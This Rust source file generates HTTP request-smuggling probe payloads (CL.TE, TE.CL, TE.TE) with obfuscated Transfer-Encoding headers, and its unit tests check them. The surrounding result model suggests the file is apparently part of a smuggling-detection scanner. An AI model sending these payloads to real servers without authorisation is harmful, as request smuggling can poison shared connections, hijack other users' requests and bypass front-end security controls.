pub fn get_cl_te_payloads(path: &str, host: &str, method: &str, custom_headers: &[String]) -> Vec<String> {
    let te_headers = vec![
        "Transfer-Encoding: chunked",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding\t: chunked",
        "Transfer-Encoding\r\n : chunked",
    ];
    let mut payloads = Vec::new();
    let custom_header_str = if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    };
    
    for te_header in te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\n\
             Content-Length: 6\r\n\
             {}\r\n\
             \r\n\
             0\r\n\
             \r\n\
             G",
            method, path, host, custom_header_str, te_header
        ));
    }
    payloads
}

pub fn get_te_cl_payloads(path: &str, host: &str, method: &str, custom_headers: &[String]) -> Vec<String> {
    let te_headers = vec![
        "Transfer-Encoding: chunked",
        " Transfer-Encoding: chunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding:\tchunked",
        "Transfer-Encoding\t: chunked",
        "Transfer-Encoding\r\n : chunked",
    ];
    let mut payloads = Vec::new();
    let custom_header_str = if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    };
    
    for te_header in te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\n\
             Content-Length: 4\r\n\
             {}\r\n\
             \r\n\
             1\r\n\
             A\r\n\
             0\r\n\
             \r\n",
            method, path, host, custom_header_str, te_header
        ));
    }
    payloads
}

pub fn get_te_te_payloads(path: &str, host: &str, method: &str, custom_headers: &[String]) -> Vec<String> {
    let custom_header_str = if custom_headers.is_empty() {
        String::new()
    } else {
        format!("{}\r\n", custom_headers.join("\r\n"))
    };
    
    let te_variations = vec![
        ("Transfer-Encoding: chunked", "Transfer-Encoding: x-custom"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: identity"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: gzip, chunked"),
        ("Transfer-Encoding: chunked", "Transfer-Encoding: chunked, identity"),
    ];
    
    let mut payloads = Vec::new();
    for (te1, te2) in te_variations {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
            Host: {}\r\n\
            {}\n\
            Content-Length: 4\r\n\
            {}\r\n\
            {}\r\n\
            \r\n\
            1\r\n\
            A\r\n\
            0\r\n\
            \r\n",
            method, path, host, custom_header_str, te1, te2
        ));
    }
    payloads
}


#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::CheckResult;

    #[test]
    fn test_cl_te_payloads_generation() {
        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &[]);
        assert!(!payloads.is_empty());
        assert_eq!(payloads.len(), 6);
        
        // Check that all payloads contain required components
        for payload in &payloads {
            assert!(payload.contains("Content-Length: 6"));
            assert!(payload.contains("Transfer-Encoding"));
            assert!(payload.contains("POST /test HTTP/1.1"));
            assert!(payload.contains("Host: example.com"));
        }
    }

    #[test]
    fn test_te_cl_payloads_generation() {
        let payloads = get_te_cl_payloads("/api", "target.com", "GET", &[]);
        assert!(!payloads.is_empty());
        assert_eq!(payloads.len(), 6);
        
        for payload in &payloads {
            assert!(payload.contains("Content-Length: 4"));
            assert!(payload.contains("Transfer-Encoding"));
            assert!(payload.contains("GET /api HTTP/1.1"));
        }
    }

    #[test]
    fn test_te_te_payloads_generation() {
        let payloads = get_te_te_payloads("/", "site.com", "POST", &[]);
        assert!(!payloads.is_empty());
        assert_eq!(payloads.len(), 4);
        
        for payload in &payloads {
            assert!(payload.contains("Transfer-Encoding"));
            assert!(payload.contains("POST / HTTP/1.1"));
        }
    }

    #[test]
    fn test_custom_headers_integration() {
        let custom_headers = vec![
            "X-Custom-Header: value1".to_string(),
            "Authorization: Bearer token".to_string(),
        ];
        
        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &custom_headers);
        
        for payload in &payloads {
            assert!(payload.contains("X-Custom-Header: value1"));
            assert!(payload.contains("Authorization: Bearer token"));
        }
    }

    #[test]
    fn test_check_result_serialization() {
        let result = CheckResult {
            check_type: "CL.TE".to_string(),
            vulnerable: false,
            payload_index: None,
            normal_status: "HTTP/1.1 200 OK".to_string(),
            attack_status: None,
            normal_duration_ms: 150,
            attack_duration_ms: None,
            timestamp: "2024-01-01T12:00:00Z".to_string(),
        };
        
        let json = serde_json::to_string(&result);
        assert!(json.is_ok());
        
        let deserialized: Result<CheckResult, _> = serde_json::from_str(&json.unwrap());
        assert!(deserialized.is_ok());
    }

    #[test]
    fn test_cl_te_payload_structure() {
        let payloads = get_cl_te_payloads("/", "example.com", "POST", &[]);
        let payload = &payloads[0];
        
        // Check for proper HTTP request structure
        assert!(payload.starts_with("POST / HTTP/1.1\r\n"));
        assert!(payload.contains("Host: example.com\r\n"));
        assert!(payload.contains("Connection: keep-alive\r\n"));
        assert!(payload.contains("Content-Length: 6"));
        assert!(payload.contains("Transfer-Encoding: chunked"));
        
        // Check for chunked encoding format
        assert!(payload.contains("0\r\n"));
    }

    #[test]
    fn test_te_cl_payload_structure() {
        let payloads = get_te_cl_payloads("/api/test", "target.com", "GET", &[]);
        let payload = &payloads[0];
        
        assert!(payload.starts_with("GET /api/test HTTP/1.1\r\n"));
        assert!(payload.contains("Host: target.com"));
        assert!(payload.contains("Content-Length: 4"));
        assert!(payload.contains("Transfer-Encoding: chunked"));
        
        // Check for chunked encoding format
        assert!(payload.contains("1\r\n"));
        assert!(payload.contains("A\r\n"));
        assert!(payload.contains("0\r\n"));
    }

    #[test]
    fn test_te_te_payload_structure() {
        let payloads = get_te_te_payloads("/test", "site.com", "POST", &[]);
        let payload = &payloads[0];
        
        assert!(payload.starts_with("POST /test HTTP/1.1\r\n"));
        assert!(payload.contains("Host: site.com"));
        assert!(payload.contains("Content-Length: 4"));
        
        // Should have two Transfer-Encoding headers
        let te_count = payload.matches("Transfer-Encoding:").count();
        assert_eq!(te_count, 2);
    }

    #[test]
    fn test_transfer_encoding_variations_cl_te() {
        let payloads = get_cl_te_payloads("/", "test.com", "POST", &[]);
        
        // Should have 6 variations
        assert_eq!(payloads.len(), 6);
        
        // Check for different TE header variations
        assert!(payloads[0].contains("Transfer-Encoding: chunked"));
        assert!(payloads[1].contains(" Transfer-Encoding: chunked"));
        assert!(payloads[2].contains("Transfer-Encoding : chunked"));
        assert!(payloads[3].contains("Transfer-Encoding:\tchunked"));
        assert!(payloads[4].contains("Transfer-Encoding\t: chunked"));
        assert!(payloads[5].contains("Transfer-Encoding\r\n : chunked"));
    }

    #[test]
    fn test_transfer_encoding_variations_te_cl() {
        let payloads = get_te_cl_payloads("/", "test.com", "POST", &[]);
        
        // Should have 6 variations
        assert_eq!(payloads.len(), 6);
        
        // Verify all variations are present
        let variations = vec![
            "Transfer-Encoding: chunked",
            " Transfer-Encoding: chunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding:\tchunked",
            "Transfer-Encoding\t: chunked",
            "Transfer-Encoding\r\n : chunked",
        ];
        
        for (i, variation) in variations.iter().enumerate() {
            assert!(payloads[i].contains(variation), "Payload {} missing variation", i);
        }
    }

    #[test]
    fn test_te_te_dual_encoding_variations() {
        let payloads = get_te_te_payloads("/", "test.com", "POST", &[]);
        
        // Should have 4 variations
        assert_eq!(payloads.len(), 4);
        
        // Check first variation has both headers
        assert!(payloads[0].contains("Transfer-Encoding: chunked"));
        assert!(payloads[0].contains("Transfer-Encoding: x-custom"));
        
        // Check second variation
        assert!(payloads[1].contains("Transfer-Encoding: chunked"));
        assert!(payloads[1].contains("Transfer-Encoding: identity"));
        
        // Check third variation
        assert!(payloads[2].contains("Transfer-Encoding: chunked"));
        assert!(payloads[2].contains("Transfer-Encoding: gzip, chunked"));
        
        // Check fourth variation
        assert!(payloads[3].contains("Transfer-Encoding: chunked"));
        assert!(payloads[3].contains("Transfer-Encoding: chunked, identity"));
    }

    #[test]
    fn test_custom_headers_placement() {
        let custom_headers = vec![
            "X-API-Key: secret123".to_string(),
            "User-Agent: TestAgent/1.0".to_string(),
        ];
        
        let payload = &get_cl_te_payloads("/", "example.com", "POST", &custom_headers)[0];
        
        // Custom headers should be present
        assert!(payload.contains("X-API-Key: secret123"));
        assert!(payload.contains("User-Agent: TestAgent/1.0"));
        
        // Should appear before Content-Length (standard ordering)
        let custom_pos = payload.find("X-API-Key").unwrap();
        let cl_pos = payload.find("Content-Length").unwrap();
        assert!(custom_pos < cl_pos);
    }

    #[test]
    fn test_empty_custom_headers() {
        let payloads = get_cl_te_payloads("/", "example.com", "POST", &[]);
        
        // Should not have extra empty lines from custom headers
        for payload in &payloads {
            // Count consecutive \n characters - should not have more than expected
            assert!(!payload.contains("\n\n\n"));
        }
    }

    #[test]
    fn test_different_methods() {
        let methods = vec!["GET", "POST", "PUT", "DELETE", "PATCH"];
        
        for method in methods {
            let payloads = get_cl_te_payloads("/api", "test.com", method, &[]);
            for payload in &payloads {
                assert!(payload.starts_with(&format!("{} /api HTTP/1.1", method)));
            }
        }
    }

    #[test]
    fn test_different_paths() {
        let paths = vec!["/", "/api", "/api/v1/users", "/test?param=value"];
        
        for path in paths {
            let payloads = get_te_cl_payloads(path, "test.com", "POST", &[]);
            for payload in &payloads {
                assert!(payload.contains(&format!("POST {} HTTP/1.1", path)));
            }
        }
    }

    #[test]
    fn test_different_hosts() {
        let hosts = vec!["example.com", "api.example.com", "192.168.1.1", "localhost"];
        
        for host in hosts {
            let payloads = get_te_te_payloads("/", host, "POST", &[]);
            for payload in &payloads {
                assert!(payload.contains(&format!("Host: {}", host)));
            }
        }
    }

    #[test]
    fn test_payload_http_compliance() {
        let payloads = get_cl_te_payloads("/test", "example.com", "POST", &[]);
        
        for payload in &payloads {
            // Each line should end with \r\n
            let lines: Vec<&str> = payload.split("\r\n").collect();
            
            // Should have HTTP version in first line
            assert!(lines[0].contains("HTTP/1.1"));
            
            // Should have proper header format (key: value)
            let has_host = lines.iter().any(|line| line.starts_with("Host:"));
            assert!(has_host, "Missing Host header");
            
            let has_connection = lines.iter().any(|line| line.starts_with("Connection:"));
            assert!(has_connection, "Missing Connection header");
        }
    }

    #[test]
    fn test_chunked_encoding_format() {
        let payloads = get_te_cl_payloads("/", "test.com", "GET", &[]);
        
        for payload in &payloads {
            // Should contain chunk size "1" followed by chunk data "A"
            assert!(payload.contains("1\r\n"));
            assert!(payload.contains("A\r\n"));
            // Should end with zero chunk
            assert!(payload.contains("0\r\n"));
        }
    }

    #[test]
    fn test_content_length_values() {
        let cl_te_payloads = get_cl_te_payloads("/", "test.com", "POST", &[]);
        for payload in &cl_te_payloads {
            assert!(payload.contains("Content-Length: 6"));
        }
        
        let te_cl_payloads = get_te_cl_payloads("/", "test.com", "POST", &[]);
        for payload in &te_cl_payloads {
            assert!(payload.contains("Content-Length: 4"));
        }
        
        let te_te_payloads = get_te_te_payloads("/", "test.com", "POST", &[]);
        for payload in &te_te_payloads {
            assert!(payload.contains("Content-Length: 4"));
        }
    }
}
